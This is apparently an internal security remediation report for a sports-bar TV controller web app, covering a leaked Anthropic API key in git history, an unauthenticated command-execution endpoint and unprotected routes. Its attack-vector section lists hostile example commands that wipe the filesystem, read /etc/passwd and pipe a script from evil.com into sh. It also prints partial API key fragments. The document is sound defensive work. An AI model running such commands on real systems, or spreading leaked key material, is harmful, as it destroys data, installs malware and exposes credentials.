# CRITICAL SECURITY FIXES - Sports Bar TV Controller

**Date:** 2025-11-04
**Status:** IN PROGRESS
**Severity:** CRITICAL

---

## PRIORITY 1: EXPOSED API KEY (CRITICAL - IMMEDIATE ACTION REQUIRED)

### Vulnerability Details
- **Location:** `.env` file
- **Exposed Key (last 8 chars):** `_bxQ-b3X_owAA`
- **Full Key Pattern:** `sk-ant-api03-_IdlGeBU...`
- **Service:** Anthropic Claude API
- **Status:** ✅ `.env` IS in `.gitignore` (line 30)
- **Git History:** ⚠️ **KEY FOUND IN GIT HISTORY** - Multiple commits contain the key

### Git History Exposure
The API key appears in multiple commits:
- `30728ba` - Complete system cleanup and Q&A worker implementation
- `36512ef` - Fix: Atlas integration - correct JSON-RPC format
- `51338b2` - Add comprehensive migration completion summary
- `24b56bb` - CRITICAL FIX: Sports Guide v5.0.0
- `24ecbb9` - docs: Add comprehensive installation guide

### Immediate Actions Required

#### 1. ROTATE THE API KEY IMMEDIATELY
**Steps to rotate:**
1. Go to https://console.anthropic.com/settings/keys
2. Delete the exposed key: `sk-ant-api03-_IdlGe...owAA`
3. Generate a new API key
4. Update `.env` file with new key:
   ```bash
   ANTHROPIC_API_KEY="your-new-key-here"
   ```
5. Restart the application:
   ```bash
   pm2 restart sports-bar-tv-controller
   ```

#### 2. REMOVE KEY FROM GIT HISTORY
**WARNING:** This rewrites git history and requires force push. Only do this if:
- You have no other collaborators currently working
- You have backups
- You understand the implications

```bash
# Option A: Use BFG Repo-Cleaner (recommended)
# Download from: https://rtyley.github.io/bfg-repo-cleaner/
java -jar bfg.jar --replace-text passwords.txt
git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push --force

# Option B: Use git-filter-repo (if installed)
git filter-repo --replace-text <(echo "[REDACTED-API-KEY]==>[REMOVED]")
git push --force

# Option C: Start fresh with a new repository
# (Safest but most disruptive)
```

#### 3. VERIFY .ENV PROTECTION
✅ `.env` is already in `.gitignore` (correct)

**Additional protection:**
```bash
# Make .env readable only by owner
chmod 600 .env

# Add .env to git's assume-unchanged
git update-index --assume-unchanged .env
```

---

## PRIORITY 2: COMMAND INJECTION VULNERABILITY (CRITICAL)

### Vulnerability Details
- **File:** `/home/ubuntu/Sports-Bar-TV-Controller/src/app/api/file-system/execute/route.ts`
- **Type:** Arbitrary Command Execution
- **Risk:** An attacker can execute ANY shell command with server privileges

### Vulnerable Code (Line 70-71)
```typescript
} else {
  // Execute raw command
  execCommand = command!  // ⚠️ DIRECT COMMAND EXECUTION
}
```

### Attack Vector
```bash
# An attacker could send:
POST /api/file-system/execute
{
  "command": "rm -rf / --no-preserve-root",  # Delete entire system
  "command": "cat /etc/passwd",              # Read sensitive files
  "command": "curl evil.com/malware.sh | sh" # Download and execute malware
}
```

### Current Protection
- ✅ Rate limiting (RateLimitConfigs.FILE_OPS)
- ✅ Input validation (ValidationSchemas.scriptExecution)
- ❌ **NO AUTHENTICATION** - Anyone can call this endpoint!
- ❌ **NO COMMAND ALLOWLIST** - Any command is accepted

### Usage Analysis
The endpoint IS being used by:
- `/src/components/FileSystemManager.tsx` (lines 137-145, 164-171)
- This is an admin UI component for executing commands

### Fix Status
**OPTION CHOSEN:** Add ADMIN authentication + strict allowlist + audit logging

---

## PRIORITY 3: UNPROTECTED ENDPOINTS (HIGH SEVERITY)

### 1. `/api/unified-tv-control/route.ts` (TV Control)
- **Risk:** Unauthorized TV control (power, input switching)
- **Current Protection:** ❌ None - validation only
- **Fix:** Add STAFF authentication

### 2. `/api/security/logs/route.ts` (Security Logs - IRONIC!)
- **Risk:** Security logs exposed to anyone!
- **Current Protection:** ✅ Query validation only
- **Fix:** Add ADMIN authentication (these are SECURITY logs!)

### 3. `/api/rag/rebuild/route.ts` (Database Rebuild)
- **Risk:** Resource exhaustion, DoS attack
- **Current Protection:** ❌ None
- **Fix:** Add ADMIN authentication

### 4. `/api/enhanced-chat/route.ts` (AI Chat)
- **Risk:** Unauthorized AI usage, prompt injection
- **Current Protection:** ✅ Validation only
- **Fix:** Add STAFF authentication

---

## PRIORITY 4: WEBHOOK SECURITY (MEDIUM)

### Current Implementation
- **File:** `/home/ubuntu/Sports-Bar-TV-Controller/src/app/api/n8n/webhook/route.ts`
- **Current Security:** Bearer token authentication (line 57)
- **Issues:**
  - ❌ No HMAC signature verification
  - ❌ No timestamp validation (replay attack protection)
  - ❌ No request ID tracking
  - ✅ Rate limiting present

### Improvements Needed
1. HMAC signature verification
2. Timestamp validation (reject old requests)
3. Request ID for replay protection
4. Enhanced audit logging

---

## IMPLEMENTATION PLAN

### Phase 1: Immediate (Complete in next 30 minutes)
1. ✅ Document exposed API key
2. 🔄 Rotate Anthropic API key
3. 🔄 Fix command injection vulnerability
4. 🔄 Add authentication to critical endpoints

### Phase 2: Short-term (Complete today)
5. 🔄 Test all modified endpoints
6. 🔄 Enhanced webhook security
7. 🔄 Create deployment/testing documentation

### Phase 3: Follow-up (Complete this week)
8. ⏳ Remove API key from git history
9. ⏳ Security audit of remaining endpoints
10. ⏳ Implement additional monitoring

---

## TESTING CHECKLIST

After fixes are applied, test:
- [ ] TV control endpoints still work with authentication
- [ ] Security logs accessible to admins only
- [ ] RAG rebuild requires admin access
- [ ] Enhanced chat requires authentication
- [ ] File system execute requires admin + allowlist
- [ ] N8N webhook still accepts valid tokens
- [ ] Rate limiting still functions
- [ ] Audit logs are generated

---

## BREAKING CHANGES

### API Endpoints Now Requiring Authentication
1. `POST /api/unified-tv-control` - Requires STAFF role or valid session
2. `GET /api/security/logs` - Requires ADMIN role
3. `POST /api/rag/rebuild` - Requires ADMIN role
4. `POST /api/enhanced-chat` - Requires STAFF role
5. `POST /api/file-system/execute` - Requires ADMIN role + allowlist

### Migration Guide
**For existing API consumers:**
1. Login via `/api/auth/login` to get session cookie
2. Or use API key in header: `X-API-Key: your-key-here`
3. Update any automated scripts/webhooks

---

## SECURITY IMPROVEMENTS SUMMARY

| Vulnerability | Severity | Status | Fix Applied |
|--------------|----------|---------|-------------|
| Exposed API Key | CRITICAL | 🔄 IN PROGRESS | Key rotation + git history cleanup |
| Command Injection | CRITICAL | 🔄 IN PROGRESS | Admin auth + allowlist + audit |
| Unprotected TV Control | HIGH | 🔄 IN PROGRESS | STAFF authentication |
| Exposed Security Logs | HIGH | 🔄 IN PROGRESS | ADMIN authentication |
| Unprotected RAG Rebuild | HIGH | 🔄 IN PROGRESS | ADMIN authentication |
| Unprotected AI Chat | HIGH | 🔄 IN PROGRESS | STAFF authentication |
| Webhook Security | MEDIUM | 🔄 IN PROGRESS | Enhanced signature verification |

---

## REMAINING SECURITY GAPS

After these fixes, consider:
1. **Secrets Management:** Use AWS Secrets Manager or similar
2. **Environment Variable Encryption:** Encrypt .env at rest
3. **API Key Rotation:** Implement automatic key rotation
4. **Security Scanning:** Add automated security scanning to CI/CD
5. **Penetration Testing:** Professional security audit
6. **Web Application Firewall:** Add WAF for production
7. **Intrusion Detection:** Implement IDS/IPS

---

## CONTACT & ESCALATION

If you suspect the exposed API key has been compromised:
1. Rotate immediately (don't wait)
2. Review Anthropic API usage logs
3. Check for unauthorized charges
4. Enable API key usage alerts
5. Consider filing incident report with Anthropic

---

**Last Updated:** 2025-11-04
**Next Review:** After all fixes implemented
